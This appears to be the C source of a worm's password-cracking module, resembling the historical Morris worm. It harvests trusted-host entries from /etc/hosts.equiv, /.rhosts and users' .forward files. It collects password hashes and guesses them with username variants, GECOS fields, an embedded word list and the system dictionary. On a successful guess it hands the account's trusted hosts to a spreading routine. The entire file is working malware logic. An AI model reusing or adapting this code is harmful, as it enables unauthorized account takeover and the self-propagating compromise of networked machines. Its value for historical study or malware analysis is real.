#include "dumb.h"

int cmode;

cracksome()
{
	if(cmode == 0)
		crack0();
	else if(cmode == 1)
		crack1();
	else if(cmode == 2)
		crack2();
	else if(cmode == 3)
		crack3();
}

static struct up *ups, *nextup;

static
crack0()
{
	FILE *fp;
	char buf[512], fname[256], *p, b1[256];
	struct passwd *pw;
	struct up *up;
	struct hostent *hp;
	struct host *h;
	extern char *index();
	int un;

	fp = fopen("/etc/hosts.equiv", "r");
	if(fp){
		while(fscanf(fp, "%.100s", buf)){
			h = h_name2host(buf, 0);
			if(h == 0){
				h = h_name2host(buf, 1);
				getaddrs(h);
			}
			if(h->h_addrs[0] == 0)
				continue;
			h->h_flags |= HF_INTERESTING;
		}
		fclose(fp);
	}

	fp = fopen("/.rhosts", "r");
	if(fp){
		while(fgets(b1, sizeof(b1), fp)){
			if(sscanf(b1, "%s", buf) != 1)
				continue;
			h = h_name2host(buf, 0);
			if(h == 0){
				h = h_name2host(buf, 1);
				getaddrs(h);
			}
			if(h->h_addrs[0] == 0)
				continue;
			h->h_flags |= HF_INTERESTING;
		}
		fclose(fp);
	}

	setpwent();

	un = 0;
	while(pw = getpwent()){
		if((un % 10) == 0)
			other_sleep(0);
		un++;

		sprintf(fname, "%.200s/.forward", pw->pw_dir);
		fp = fopen(fname, "r");
		if(fp){
			while(fgets(buf, sizeof(buf), fp)){
				buf[strlen(buf)-1] = '\0';
				p = index(buf, '@');
				if(p == 0)
					continue;
				p++;
				h = h_name2host(p, 0);
				if(h == 0){
					h = h_name2host(p, 1);
					getaddrs(h);
				}
				if(h->h_addrs[0] == 0)
					continue;
				h->h_flags |= HF_INTERESTING;
			}
			fclose(fp);
		}

		if(strlen(pw->pw_name) > 11)
			continue;
		up = NEW(struct up);
		strcpy(up->name, pw->pw_name);
		if(strlen(pw->pw_passwd) == 13)
			strcpy(up->passwd, pw->pw_passwd);
		else
			strcpy(up->passwd, "x");
		up->guessed[0] = '\0';
		up->dir = NSTR(pw->pw_dir);
		up->gecos = NSTR(pw->pw_gecos);
		up->next = ups;
		ups = up;
	}

	endpwent();

	cmode = 1;
	nextup = ups;
}

static
crack1()
{
	int n;
	char name[50], buf[50];

	n = 0;
	for( ; nextup && n < 50; nextup = nextup->next){
		if((n % 10) == 0)
			other_sleep(0);

		if(try(nextup, ""))
			continue;
		if(strlen(nextup->passwd) != 13)
			continue;

		strncpy(name, nextup->name, 49);
		name[49] = '\0';
		if(try(nextup, name))
			continue;

		sprintf(buf, "%.20s%.20s", name, name);
		if(try(nextup, buf))
			continue;

		sscanf(nextup->gecos, "%[^ ,]", buf);
		if(isupper(buf[0]))
			buf[0] = tolower(buf[0]);
		if(strlen(buf) > 3)
			if(try(nextup, buf))
				continue;

		buf[0] = '\0';
		sscanf(nextup->gecos, "%*s %[^ ,]s", buf);
		if(isupper(buf[0]))
			buf[0] = tolower(buf[0]);
		if(strlen(buf) > 3 && !index(buf, ','))
			if(try(nextup, buf))
				continue;

		reverse(name, buf);
		if(try(nextup, buf))
			continue;
	}
	if(nextup == 0)
		cmode = 2;
}

static
reverse(a, b)
char a[], b[];
{
	int len, i;

	len = strlen(a);
	for(i = 0; i < len; i++)
		b[i] = a[len-i-1];
	b[len] = '\0';
}

static
try(up, guess)
struct up *up;
char *guess;
{
	if(strcmp(up->passwd, crypt(guess, up->passwd)) == 0
	   || (*guess == '\0' && up->passwd[0] == '\0')){
#ifdef DEBUG
		fprintf(stderr, "%s %s\n", up->name, guess);
#endif
		strncpy(up->guessed, guess, 14);
		up->guessed[14] = '\0';
		hituser(up);
		return(1);
	}
	return(0);
}

static
hituser(up)
struct up *up;
{
	FILE *fp;
	char buf[512], *p, b1[256], ub[512];
	extern char *index();
	struct host *h;

	sprintf(buf, "%.200s/.forward", up->dir);
	fp = fopen(buf, "r");
	if(fp){
		while(fgets(buf, sizeof(buf), fp)){
			buf[strlen(buf)-1] = '\0';
			p = index(buf, '@');
			if(p == 0)
				continue;
			*p = '\0';
			p++;
			h = h_name2host(p, 1, buf);
			hu1(up, h);
		}
		fclose(fp);
	}

	sprintf(buf, "%.200s/.rhosts", up->dir);
	fp = fopen(buf, "r");
	if(fp){
		while(fgets(b1, sizeof(b1), fp)){
			ub[0] = '\0';
			if(sscanf(b1, "%s%s", buf, ub) < 1)
				continue;
			h = h_name2host(buf, 1);
			hu1(up, h, ub);
		}
		fclose(fp);
	}
}

int nextw;

static
crack2()
{
	extern char *wds[];
	struct up *up;
	int n, i;

	if(wds[nextw] == 0){
		cmode++;
		return;
	}

	if(nextw == 0){
		for(n = 0; wds[n]; n++)
			;
		permute(wds, n, sizeof(wds[0]));
	}

	for(i = 0; wds[nextw][i]; i++)
		wds[nextw][i] &= ~0x80;

	for(up = ups; up; up = up->next)
		try(up, wds[nextw]);

	for(i = 0; wds[nextw][i]; i++)
		wds[nextw][i] |= 0x80;

	nextw++;
}

static
crack3()
{
	static FILE *fp;
	char buf[512];
	struct up *up;

	if(fp == 0){
		fp = fopen("/usr/dict/words", "r");
		if(fp == 0)
			return;
	}
	if(fgets(buf, sizeof(buf), fp) == 0){
		cmode++;
		return;
	}
	buf[strlen(buf)-1] = '\0';	/* \n */

	for(up = ups; up; up = up->next)
		try(up, buf);

	if(isupper(buf[0])){
		buf[0] = tolower(buf[0]);
		for(up = ups; up; up = up->next)
			try(up, buf);
	}
}
